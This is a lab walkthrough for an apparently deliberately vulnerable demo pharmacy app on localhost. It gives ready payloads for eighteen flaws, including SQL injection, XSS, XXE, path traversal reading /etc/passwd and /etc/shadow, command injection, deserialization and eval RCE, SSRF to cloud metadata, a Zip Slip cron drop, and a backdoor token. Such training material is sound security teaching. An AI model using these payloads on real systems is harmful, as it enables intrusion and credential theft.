# IWA Pharmacy Direct — Vulnerability Demo Walkthrough

> ⚠️ **WARNING: For educational/demo use only. Do NOT use against real systems.**

## Setup

```bash
npm install && npm run dev
# App at http://localhost:8888
# Seeded credentials: admin/Password123!, user1/Password123!
```

---

## 1. SQL Injection (CWE-89)

**Endpoint:** `GET /api/v3/users?keywords=<payload>`  
**Auth:** ****** (get from POST /api/v3/site/sign-in)

```bash
# Sign in first
TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Password123!"}' | jq -r .data.token)

# Classic OR injection — returns ALL users
curl -H "Authorization: ******" \
  "http://localhost:8888/api/v3/users?keywords=%27+OR+%271%27%3D%271"

# Admin user search also vulnerable
# UI: http://localhost:8888/admin/users?keywords=' OR '1'='1
```

**Expected:** All users returned instead of filtered results.

---

## 2. Reflected XSS (CWE-79)

**Endpoint:** `GET /products?keywords=<script>alert(1)</script>`

```
http://localhost:8888/products?keywords=<script>alert(document.cookie)</script>
http://localhost:8888/login?error=<script>alert(1)</script>
```

**Expected:** Alert dialog pops — payload reflected unescaped via `<%- keywords %>`.

---

## 3. Stored XSS (CWE-79)

**Via API review creation:**

```bash
TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"Password123!"}' | jq -r .data.token)

# Get a product ID
PRODUCT_ID=$(curl -s http://localhost:8888/api/v3/products | jq -r '.data.rows[0].id')

curl -X POST http://localhost:8888/api/v3/reviews \
  -H "Authorization: ******" \
  -H "Content-Type: application/json" \
  -d "{\"comment\":\"<script>alert('StoredXSS')</script>\",\"rating\":5,\"productId\":\"$PRODUCT_ID\"}"
```

**Expected:** XSS fires when admin views reviews at `/admin/reviews` or product detail page.

---

## 4. XXE — XML External Entity Injection (CWE-611)

**Endpoint:** `POST /user/upload-xml-file` (login as user1 first)

Create file `/tmp/xxe.xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<data><value>&xxe;</value></data>
```

```bash
# Login via browser at http://localhost:8888/login
# Then upload the file at http://localhost:8888/user/upload-xml-file
```

**Expected:** Contents of `/etc/hosts` displayed in parsed output.

---

## 5. Path Traversal (CWE-22)

**Endpoint:** `GET /user/files/download/unverified?file=../../etc/passwd`

```
http://localhost:8888/user/files/download/unverified?file=../../../etc/passwd
```

**Expected:** `/etc/passwd` file contents returned.

---

## 6. OS Command Injection (CWE-78)

**Endpoint:** `POST /admin/command-shell` or `POST /user/command-shell`

```
cmd=ls -la; cat /etc/passwd
cmd=id; whoami
cmd=ls /; cat /etc/shadow
```

**Expected:** Shell output including injected commands rendered on page.

---

## 7. Insecure Deserialization (CWE-502)

**Endpoint:** `POST /user/import-settings`

```bash
# Generate payload (run once in Node.js):
# const serialize = require('node-serialize');
# const payload = serialize.serialize({rce: function(){ return require('child_process').execSync('id').toString(); }});
# console.log(Buffer.from(payload).toString('base64'));

TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"Password123!"}' | jq -r .data.token)

# RCE payload via node-serialize
PAYLOAD=$(node -e "const s=require('node-serialize');console.log(Buffer.from(s.serialize({x:function(){return require('child_process').execSync('id').toString()}})).toString('base64'))")

curl -s -X POST http://localhost:8888/user/import-settings \
  -H "Authorization: ******" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$PAYLOAD\"}"
```

---

## 8. Log Injection (CWE-117)

**Endpoint:** `POST /admin/log?val=<payload>`

```
http://localhost:8888/admin/log?val=%0AWARNING%20Fake+admin+login+success+for+root
```

**Expected:** Injected log line appears in log file with forged content.

---

## 9. Sensitive Data in Logs (CWE-532)

**Step:** Attempt login and check logs.

```bash
curl -X POST http://localhost:8888/api/v3/site/sign-in \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Password123!"}'
cat ./logs/iwa.log | grep "password"
```

**Expected:** Password `Password123!` appears in the debug log.

---

## 10. Broken Access Control / IDOR (CWE-306, CWE-639)

**Endpoint:** `PUT /api/v3/users/:id` — **No authentication required!**

```bash
# Get a user ID
USER_ID=$(curl -s http://localhost:8888/api/v3/users/1 2>/dev/null || \
  curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Password123!"}' | \
  node -e "const d=JSON.parse(require('fs').readFileSync('/dev/stdin','utf8'));console.log(d.data.id)")

# Update any user WITHOUT authentication (mass assignment too)
curl -X PUT http://localhost:8888/api/v3/users/$USER_ID \
  -H "Content-Type: application/json" \
  -d '{"enabled":false,"locked":true,"mfaType":"MFA_NONE"}'
```

**Expected:** User updated without any auth token.

---

## 11. Prototype Pollution (CWE-1321)

**Endpoint:** `POST /user/edit-profile` (logged in as user1)

```bash
curl -X POST http://localhost:8888/user/edit-profile \
  -H "Cookie: IWASESSION=<session>" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true},"firstName":"Test"}'
```

**Expected:** `Object.prototype.admin === true` — pollutes Node.js prototype chain.

---

## 12. Admin Backdoor (CWE-798)

**URL:** `http://localhost:8888/admin/backdoor?token=iwa-admin-backdoor-super-secret-token-cwe798`

**Expected:** Backdoor access granted without standard authentication.

---

## 13. Code Injection via eval (CWE-95)

**Endpoint:** `POST /admin/diagnostics` — field `expr`

```
expr=require('child_process').execSync('id').toString()
expr=process.env
```

**Expected:** RCE via eval on server.

---

## 14. SSRF (CWE-918)

**Endpoint:** `POST /admin/diagnostics` — field `url`

```
url=http://169.254.169.254/latest/meta-data/
url=http://localhost:8888/api/v3/users
url=file:///etc/passwd
```

**Expected:** Server-side request made to internal address.

---

## 15. Zip Slip (CWE-22)

**Endpoint:** `POST /admin/backup` — upload a crafted ZIP

```bash
# Create malicious ZIP
mkdir -p /tmp/zipslip
echo '*/1 * * * * root echo pwned > /tmp/pwned.txt' > /tmp/zipslip/evil.txt
cd /tmp && zip malicious.zip ../../etc/cron.d/evil.txt

# Upload via http://localhost:8888/admin/backup
```

**Expected:** Files extracted to arbitrary paths outside `./data/restore/`.

---

## 16. Open Redirect (CWE-601)

```
http://localhost:8888/login?redirect=http://evil.example.com
```

After successful login, user is redirected to `http://evil.example.com`.

---

## 17. Permissive CORS (CWE-942)

```bash
curl -H "Origin: https://evil.example.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     http://localhost:8888/api/v3/users
```

**Expected:** `Access-Control-Allow-Origin: https://evil.example.com` in response.

---

## 18. Verbose Error Handling (CWE-209)

```bash
curl http://localhost:8888/api/v3/users/invalid-id-that-causes-error
```

**Expected:** Full stack trace and SQL error returned in JSON response.

---

## SCA / Vulnerable Dependencies

```bash
npm audit
```

**Expected:** Reports for lodash, minimist, node-serialize, jsonwebtoken, axios, xml2js, handlebars.
